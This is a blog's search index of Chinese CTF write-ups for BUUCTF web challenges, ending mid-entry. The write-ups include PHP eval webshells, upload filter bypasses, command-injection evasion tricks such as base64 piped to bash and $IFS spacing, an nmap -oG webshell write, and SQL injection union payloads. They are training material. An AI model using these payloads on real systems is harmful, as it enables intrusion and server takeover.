<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BUUCTF-极客大挑战 2019 Upload</title>
    <url>/2020/02/17/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="极客大挑战 2019 Upload"></a>极客大挑战 2019 Upload</h1><p>打开题目是个上传，随便上传一个图片 竟然告诉我NOT image<br>所以考虑一下文件类型绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">常用一句话：</span><br><span class="line">GIF89a? </span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>PHP绕过后缀名检测：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php,php3,php4,php5,phtml.pht</span><br></pre></td></tr></table></figure>

<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Upload/0.png" alt="avatar"></p>
<p>上传成功，用蚁剑连接<br>在根目录下得到flag</p>
<p>注意，文件都存在upload目录下</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-安洵杯 2019 easy_web</title>
    <url>/2020/02/17/BUUCTF-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/</url>
    <content><![CDATA[<p>打开之后 看到题目 确实很真实 WEB狗可咋活啊</p>
<p>查看源码也啥都没有，最后可疑的就是URL中img后面的字符串，尝试一下base64<br>最后经过两次base64一个hex得到555.png</p>
<p>尝试一下访问index.php 用它的方法得到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</span><br></pre></td></tr></table></figure>
<p>查看源码，解密一下得到源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">$cmd = $_GET[&apos;cmd&apos;];</span><br><span class="line">if (!isset($_GET[&apos;img&apos;]) || !isset($_GET[&apos;cmd&apos;])) </span><br><span class="line">    header(&apos;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&apos;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&apos;img&apos;])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &apos;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&apos;;</span><br><span class="line">    die(&quot;xixiï½ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot; . $txt . &quot;&apos;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&apos;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&apos;a&apos;] !== (string)$_POST[&apos;b&apos;] &amp;&amp; md5($_POST[&apos;a&apos;]) === md5($_POST[&apos;b&apos;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>看这一段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ((string)$_POST[&apos;a&apos;] !== (string)$_POST[&apos;b&apos;] &amp;&amp; md5($_POST[&apos;a&apos;]) === md5($_POST[&apos;b&apos;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br></pre></td></tr></table></figure>
<p>可以考虑用md5碰撞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<p>这一段是过滤 过滤的太挺多的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&apos;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd))</span><br></pre></td></tr></table></figure>

<p>cmd没有过滤sort，所以可以使用sort%20/flag<br>在看了WP之后，得到知识点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">以下正则可以过滤\</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$cmd=&quot;\\&quot;;</span><br><span class="line">echo $cmd;</span><br><span class="line">if (preg_match(&quot;/|\\\\|\?/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;1&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if (preg_match(&quot;/\\\\/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;2&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if (preg_match(&quot;/|\\|/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;3&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if (preg_match(&quot;/|\|/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;4&quot;);</span><br><span class="line">&#125;</span><br><span class="line">// \1234</span><br><span class="line">linux命令中可以加\，所以甚至可以ca\t /fl\ag</span><br></pre></td></tr></table></figure>

<p>所以还可以使用ca\t%20/flag</p>
<p>三个表达式结合一下，payload:<br><img src="/images/BUUCTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019easyweb/0.png" alt="avatar"></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-SWPU2019 Web1</title>
    <url>/2020/02/17/BUUCTF-SWPU2019-Web1/</url>
    <content><![CDATA[<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="SWPU2019 Web1"></a>SWPU2019 Web1</h1><p>打开是个登录界面，先注册登录进去</p>
<p>发现可以申请广告位，在广告位</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">&apos;</span><br></pre></td></tr></table></figure>
<p>得到回显，证明有SQL注入</p>
<p>试一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos;union select 1,2,3</span><br></pre></td></tr></table></figure>
<p>发现空格被过滤了 用/**/代替一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos;union/**/select/**/1,2,3</span><br></pre></td></tr></table></figure>
<p>最后用二分法试出有22个字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22</span><br></pre></td></tr></table></figure>

<p>这里information_schema被过滤了 所以考虑使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql.innodb_table_stats用于报表名</span><br><span class="line">select group_concat(table_name) from mysql.innodb_table_stats</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22</span><br></pre></td></tr></table></figure>
<p>得到表名</p>
<p>这里还需要用到无列名注入，之前出现过不再多介绍</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos;union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&apos;22</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-GXYCTF2019Ping Ping</title>
    <url>/2020/02/10/BUUCTF-GXYCTF2019Ping-Ping/</url>
    <content><![CDATA[<h1 id="GXYCTF2019Ping-Ping"><a href="#GXYCTF2019Ping-Ping" class="headerlink" title="GXYCTF2019Ping Ping"></a>GXYCTF2019Ping Ping</h1><p>ping命令行注入<br>尝试一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1|ls</span><br></pre></td></tr></table></figure>
<p>发现有flag.php和index.php两个文件</p>
<p>这里记录一下linux的绕过技巧：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">linux常见绕过方法</span><br><span class="line">空格过滤</span><br><span class="line">&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 IFS、&#123;IFS&#125;、IFS、IFS等</span><br><span class="line"></span><br><span class="line">一些命令分隔符</span><br><span class="line">linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</span><br><span class="line"></span><br><span class="line">windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</span><br><span class="line"></span><br><span class="line">花括号的别样用法</span><br><span class="line">在Linux bash中还可以使用&#123;OS_COMMAND,ARGUMENT&#125;来执行系统命令</span><br><span class="line">&#123;cat,flag&#125;</span><br><span class="line"></span><br><span class="line">黑名单绕过</span><br><span class="line">拼接绕过:a=l;b=s;aaab</span><br><span class="line">编码绕过</span><br><span class="line"></span><br><span class="line">base64：</span><br><span class="line">echo “Y2F0IC9mbGFn”|base64-d|bash</span><br><span class="line">&gt;cat /flag</span><br><span class="line"></span><br><span class="line">hex：</span><br><span class="line">echo “636174202f666c6167” | xxd -r -p|bash</span><br><span class="line">&gt;cat /flag</span><br><span class="line">oct：</span><br><span class="line">$(printf “\154\163”)</span><br><span class="line">&gt;ls</span><br><span class="line"></span><br><span class="line">$(printf “\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”)</span><br><span class="line">&gt;cat /flag</span><br><span class="line"></span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|$0</span><br><span class="line">&gt;cat /flag</span><br><span class="line">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125;</span><br><span class="line">&gt; 1.php</span><br><span class="line">单引号和双引号绕过</span><br><span class="line">比如：ca’&apos;t flag 或ca&quot;&quot;t flag</span><br><span class="line">反斜杠绕过</span><br><span class="line">比如：ca\t fl\ag</span><br><span class="line">5、利用Shell 特殊变量绕过</span><br><span class="line">例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。</span><br><span class="line">@表示（@表示（@表示（@:同样也是获取当前shell的参数，不加引号和∗是一样的，那么加了引号如：&quot;*是一样的，那么加了引号如：&quot;∗是一样的，那么加了引号如：&quot;@&quot; 表示将所有的参数视为不同独立的字符串，相当于&quot;$1&quot; &quot;2&quot;..）&lt;br&gt;比如：ca2&quot;..）&lt;br&gt;比如：ca2&quot;..）&lt;br&gt;比如：ca@t fla$@g</span><br><span class="line"></span><br><span class="line">ca$1t fla$2g</span><br></pre></td></tr></table></figure>
<p>再尝试一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1|cat flag.php</span><br></pre></td></tr></table></figure>
<p>发现空格被过滤了  用$IFS$9代替空格</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1|cat$IFS$9flag.php</span><br></pre></td></tr></table></figure>
<p>发现flag被过滤了  访问一下index.php  得到源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|\&apos;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&apos;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>过滤掉了空格，bash和flag的贪心匹配 所以想f/l/a/g这样的操作也行不通了</p>
<p>所以利用变量构造</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1;a=f;d=ag;c=l;cat$IFS$a$c$d.php</span><br></pre></td></tr></table></figure>
<p>查看源码得到flag</p>
<p>网上还有一种秒题技巧：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>
<p>内联执行的做法 </p>
<p>官方做法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
<p>过滤bash?那就用sh。sh的大部分脚本都可以在bash下运行</p>
<p>实在是太强了</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-2018 Online Tool</title>
    <url>/2020/02/10/BUUCTF-2018-Online-Tool/</url>
    <content><![CDATA[<h1 id="2018-Online-Tool"><a href="#2018-Online-Tool" class="headerlink" title="2018 Online Tool"></a>2018 Online Tool</h1><p>打开就是源码 审计一下 挺简单的 除了escapeshellarg和escapeshellcmd没有见过，百度了一下<br><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">https://paper.seebug.org/164/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">传入的参数是：172.17.0.2&apos; -v -d a=1</span><br><span class="line"></span><br><span class="line">经过escapeshellarg处理后变成了&apos;172.17.0.2&apos;\&apos;&apos; -v -d a=1&apos;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line"></span><br><span class="line">经过escapeshellcmd处理后变成&apos;172.17.0.2&apos;\\&apos;&apos; -v -d a=1\&apos;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：</span><br><span class="line">http://php.net/manual/zh/function.escapeshellcmd.php</span><br><span class="line"></span><br><span class="line">最后执行的命令是curl &apos;172.17.0.2&apos;\\&apos;&apos; -v -d a=1\&apos;，由于中间的\\被解释为\而不再是转义字符，所以后面的&apos;没有被转义，与再后面的&apos;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1&apos;，即向172.17.0.2\发起请求，POST 数据为a=1&apos;</span><br></pre></td></tr></table></figure>
<p>最后看一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host)</span><br></pre></td></tr></table></figure>
<p>百度一下发现nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p>
<p>构造payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?host=&apos; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &apos;</span><br></pre></td></tr></table></figure>

<p>得到文件名：4061e5b4e6077706350ae44e5292f3ef<br>用菜刀连接4061e5b4e6077706350ae44e5292f3ef/hack.php<br>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-De1CTF2019 SSRF Me</title>
    <url>/2020/02/10/BUUCTF-De1CTF2019-SSRF-Me/</url>
    <content><![CDATA[<h1 id="De1CTF2019-SSRF-Me"><a href="#De1CTF2019-SSRF-Me" class="headerlink" title="De1CTF2019 SSRF Me"></a>De1CTF2019 SSRF Me</h1><p>打开之后就是源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line">#encoding=utf-8</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&apos;latin1&apos;)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(16)</span><br><span class="line"></span><br><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    def Exec(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[&apos;code&apos;] = 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&apos;data&apos;] = resp</span><br><span class="line">                else:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&apos;code&apos;] = 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)</span><br><span class="line">                result[&apos;code&apos;] = 200</span><br><span class="line">                result[&apos;data&apos;] = f.read()</span><br><span class="line">            if result[&apos;code&apos;] == 500:</span><br><span class="line">                result[&apos;data&apos;] = &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&apos;code&apos;] = 500</span><br><span class="line">            result[&apos;msg&apos;] = &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">#generate Sign For Action Scan.</span><br><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        return urllib.urlopen(param).read()[:50]</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"></span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line">def md5(content):</span><br><span class="line">    return hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line">def waf(param):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.debug = False</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;,port=80)</span><br></pre></td></tr></table></figure>

<p>用了python的flak框架</p>
<p>有三个路由：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br></pre></td></tr></table></figure>
<p>大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，param=flag.txt，action 中要含有 read 和 scan，且 sign=md5(secert_key + param + action)</p>
<p>触及到盲区了  看一下WP</p>
<p>当我们访问/geneSign时，action默认为scan，而当我们通过Exec访问checkSign时，即访问getSign函数时，action为我们的cookies中的action值。</p>
<p>不妨假设 secert_key 是 xxx ，那么在开始访问 /geneSign?param=flag.txt 的时候，返回的 md5 就是 md5(‘xxx’ + ‘flag.txt’ + ‘scan’) ，在 python 里面上述表达式就相当于 md5(xxxflag.txtscan) ，这就很有意思了。</p>
<p>直接构造访问 /geneSign?param=flag.txtread ，拿到的 md5 就是 md5(‘xxx’ + ‘flag.txtread’ + ‘scan’) ，等价于 md5(‘xxxflag.txtreadscan’) ，这就达到了目标。</p>
<p>访问/geneSign?param=flag.txtread<br>得到md5</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a99fca9514e5fd8a0e324f832e37cab7</span><br></pre></td></tr></table></figure>
<p>再访问 /De1ta?param=flag.txt   并在cookie中添加 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cookie: action=scan;sign=a99fca9514e5fd8a0e324f832e37cab7</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战2019 BuyFlag</title>
    <url>/2020/02/06/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/</url>
    <content><![CDATA[<h1 id="极客大挑战2019-BuyFlag"><a href="#极客大挑战2019-BuyFlag" class="headerlink" title="极客大挑战2019 BuyFlag"></a>极客大挑战2019 BuyFlag</h1><p>打开playing </p>
<p>得到提示 Only Cuit’s students can buy the FLAG</p>
<p>先把user改了1<br><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019BuyFlag/0.png" alt="avatar"></p>
<p>又根据下面的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">	$password = $_POST[&apos;password&apos;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&apos;t be number&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password == 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要POST请求  更改请求 根据代码得知是弱口令<br>所以传参:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password=404%20</span><br></pre></td></tr></table></figure>
<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019BuyFlag/1.png" alt="avatar"></p>
<p>又得到提示 要买flag<br>本来想用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password=404%20&amp;money=100000000</span><br></pre></td></tr></table></figure>
<p>但是发现超出了长度</p>
<p>所以猜测使用了strcmp</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password=404%20&amp;money[]=1</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战2019 Http</title>
    <url>/2020/02/06/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/</url>
    <content><![CDATA[<h1 id="极客大挑战2019-Http"><a href="#极客大挑战2019-Http" class="headerlink" title="极客大挑战2019 Http"></a>极客大挑战2019 Http</h1><p>打开之后 查看一下源码  查看文件Secret.php</p>
<p>访问一下<br><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/0.png" alt="avatar"></p>
<p>抓一下包<br>添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Referer: https://www.Sycsecret.com</span><br></pre></td></tr></table></figure>

<p>得到提示<br><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/1.png" alt="avatar"></p>
<p>再添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-Agent:Syclover</span><br></pre></td></tr></table></figure>
<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/2.png" alt="avatar"></p>
<p>要求本地访问<br>再添加</p>
